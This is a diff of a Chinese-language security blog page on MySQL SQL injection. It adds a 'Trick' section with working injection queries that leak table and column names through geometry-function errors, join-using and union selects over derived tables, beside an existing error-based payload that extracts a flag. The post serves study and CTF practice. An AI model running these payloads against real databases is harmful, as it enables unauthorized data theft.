@@ -15,7 +15,7 @@
 <meta property="og:url" content="K4ngx.github.io/2018/02/06/SQLi/index.html">
 <meta property="og:site_name" content="K4ng&#39;s blog">
 <meta property="og:description" content="(MySQL为例) (参考 MySQL注入天书 made by lcamry) 注入点：GET参数、POST参数、Cookie、HTTP头（包括但不限于User-agent、Referer、X-Forwarded-For）。 0x01 注入类型 联合查询 盲注 布尔盲注 时间盲注   报错注入 宽字节注入 堆叠注入  0x02 MySQL常用函数字符串连接 concat(str1, str2, s">
-<meta property="og:updated_time" content="2018-02-06T10:21:59.000Z">
+<meta property="og:updated_time" content="2018-02-18T12:18:20.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="浅谈SQLi">
 <meta name="twitter:description" content="(MySQL为例) (参考 MySQL注入天书 made by lcamry) 注入点：GET参数、POST参数、Cookie、HTTP头（包括但不限于User-agent、Referer、X-Forwarded-For）。 0x01 注入类型 联合查询 盲注 布尔盲注 时间盲注   报错注入 宽字节注入 堆叠注入  0x02 MySQL常用函数字符串连接 concat(str1, str2, s">
@@ -290,6 +290,13 @@
 <li><p>上一条技巧的懵逼形式：<code>select count(*) from (select 1 union select null union select !1)x group by concat((select flag from flag limit 1),floor(rand(0)*2))</code></p>
 </li>
 </ul>
+<p><strong>Trick</strong></p>
+<p>通过<code>polygon()</code>和<code>linestring()</code>可爆出当前表名。还有<code>multipoint、multilinestring、multipolygon</code>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> proid=<span class="number">1</span> <span class="keyword">and</span> polygon(proid);</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> proid=<span class="number">1</span> <span class="keyword">and</span> linestring(proid);</div></pre></td></tr></table></figure>
+<p>通过<code>join + using</code>的方法来获取字段名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">as</span> A <span class="keyword">join</span> <span class="keyword">user</span> <span class="keyword">as</span> B <span class="keyword">using</span>(pro_id)) <span class="keyword">as</span> C;</div></pre></td></tr></table></figure>
+<p>通过联合查询，运用虚拟表在不出现字段名的情况下查出内容：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> proid=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,a<span class="number">.1</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> dual <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>)a;</div></pre></td></tr></table></figure>
 <h3 id="f-导入导出操作"><a href="#f-导入导出操作" class="headerlink" title="f.导入导出操作"></a>f.导入导出操作</h3><ul>
 <li>load_file导出文件：</li>
 </ul>
@@ -432,6 +439,15 @@
   
 <nav id="article-nav">
   
+    <a href="/2018/03/04/xxe/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
   
     <a href="/2018/01/04/xss/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">浅谈XSS</div>
@@ -563,6 +579,10 @@ return o(t,i(n),arguments.length<3?void 0:u(arguments[2]))}})},function(t,n,r){v
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">xss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">XXE</a>
               </li>
             
             <div class="clearfix"></div>
